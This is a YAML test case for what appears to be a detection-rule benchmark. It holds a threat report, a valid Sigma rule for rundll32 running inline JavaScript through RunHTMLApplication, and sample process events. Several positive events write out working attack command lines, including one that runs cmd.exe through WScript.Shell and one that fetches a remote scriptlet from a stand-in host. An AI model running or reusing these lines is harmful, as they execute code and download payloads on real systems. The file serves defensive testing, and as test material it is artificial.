@@ -1,0 +1,130 @@
+id: CTL1-01
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: valid metadata, tags match T1218.011, every value (rundll32.exe, javascript:, RunHTMLApplication)
+  is quoted in the evidence, it uses two selections that must both hold, and it matches only rundll32
+  command lines carrying both strings, so benign rundll32 control-panel and printer calls do not match.'
+expected_gate: none
+report_text: 'During the intrusion at the logistics firm, the operator ran a first-stage script through
+  a signed system binary. Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication
+  export with an inline script, for example rundll32.exe javascript:\..\mshtml,RunHTMLApplication followed
+  by a WScript.Shell Run call. Legitimate use of rundll32.exe never passes a javascript: URI on the command
+  line. The same pattern appeared on three workstations within ten minutes, and every instance had Word
+  or Explorer as the parent process. Detection should alert on rundll32.exe whose command line carries
+  both javascript: and RunHTMLApplication, which keeps the rule specific to this loader.'
+evidence:
+- Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication export with an inline
+  script
+- 'Legitimate use of rundll32.exe never passes a javascript: URI on the command line.'
+logsource: windows_process_creation
+techniques:
+- T1218.011
+sigma_yaml: |
+  title: Rundll32 Executing Inline JavaScript via RunHTMLApplication
+  id: 5b0c7a1e-3d42-4f6b-8a91-2c7e4d9f1a01
+  status: experimental
+  description: 'Detects rundll32.exe calling the mshtml RunHTMLApplication export with an inline javascript: URI to run a script.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.011
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith: '\rundll32.exe'
+    selection_cli:
+      CommandLine|contains|all:
+        - 'javascript:'
+        - 'RunHTMLApplication'
+    condition: selection_img and selection_cli
+  falsepositives:
+    - 'No legitimate software is known to pass a javascript: URI to rundll32.exe'
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject('WScript.Shell');h.Run('cmd.exe
+      /c whoami')
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\rundll32.exe
+    cmd: rundll32 javascript:"\..\mshtml,runhtmlapplication ";document.write();GetObject('script:http://files.cranemail.test/a.sct')
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();window.close()
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Program Files\Google\Chrome\Application\chrome.exe
+    cmd: '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default'
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks /query /fo LIST
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe shell32.dll,Control_RunDLL desk.cpl
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe printui.dll,PrintUIEntry /il
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
